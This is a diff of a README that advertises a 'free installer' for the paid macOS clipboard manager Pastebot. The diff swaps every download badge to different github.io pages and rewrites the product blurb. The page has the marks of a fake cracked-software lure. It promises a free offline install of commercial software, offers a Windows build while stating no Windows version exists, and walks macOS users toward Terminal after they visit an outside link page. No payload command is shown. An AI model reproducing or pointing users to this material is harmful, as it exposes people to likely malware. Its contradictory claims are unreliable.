@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Clipboard+Manager-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Pastebot Free Installer** — Pastebot is a macOS clipboard manager with a powerful filtering system. Works without internet access, no account required. Full offline installation.
+**💻 Pastebot Free Installer** — Pastebot is a macOS clipboard manager that stores your entire copy-paste history and provides powerful text transformation tools. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Pastebot](https://img.shields.io/badge/⬇_Install_Pastebot-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Pastebot](https://img.shields.io/badge/⬇_Install_Pastebot-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Pastebot
 
-Pastebot is a macOS clipboard manager with a powerful filtering system. Store unlimited clipboard history, create text transformations that modify pasted content (remove formatting, change case, trim whitespace), and apply sequences of transformations for consistent text cleanup. Pastebot's filter system distinguishes it from simpler clipboard managers for users who frequently process text.
+Pastebot is a macOS clipboard manager that stores your entire copy-paste history and provides powerful text transformation tools. Quickly search through clipboard history, pin frequently used items, and apply text filters like case conversion, removing formatting, or running custom transformations. Pastebot's keyboard-driven interface keeps your hands on the keyboard and clipboard management fast.
 
 ---
 
 ## ❌ Problem: Pastebot is hard to access
 
-- **macOS Only** — No Windows or iOS version
-- **Commercial License** — Paid application
-- **Learning Investment** — Filter and transformation system requires learning to use effectively
-- **Niche Power Features** — Transformation pipeline most valuable for heavy text processing workflows
+- **macOS Only** — No Windows version
+- **Security Considerations** — Clipboard history may capture sensitive data like passwords
+- **iCloud Sync** — Cross-device sync requires iCloud
+- **Subscription Model** — Premium features require ongoing payment
 
 ---
 
@@ -61,9 +61,9 @@ Pastebot is a macOS clipboard manager with a powerful filtering system. Store un
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Pastebot is a macOS clipboard manager with a powerful filtering system. Store un
 
 <div align="center">
 
-[![⬇ Install Pastebot](https://img.shields.io/badge/⬇_Install_Pastebot-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Pastebot](https://img.shields.io/badge/⬇_Install_Pastebot-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Pastebot is a macOS clipboard manager with a powerful filtering system. Store un
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Pastebot is a macOS clipboard manager with a powerful filtering system. Store un
 
 ---
 
-**Pastebot Free Installer** — Pastebot is a macOS clipboard manager with a powerful filtering system. Install without internet connection today!
+**Pastebot Free Installer** — Pastebot is a macOS clipboard manager that stores your entire copy-paste history and provides powerful text transformation tools. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Pastebot](https://img.shields.io/badge/⬇_Install_Pastebot-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Pastebot](https://img.shields.io/badge/⬇_Install_Pastebot-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
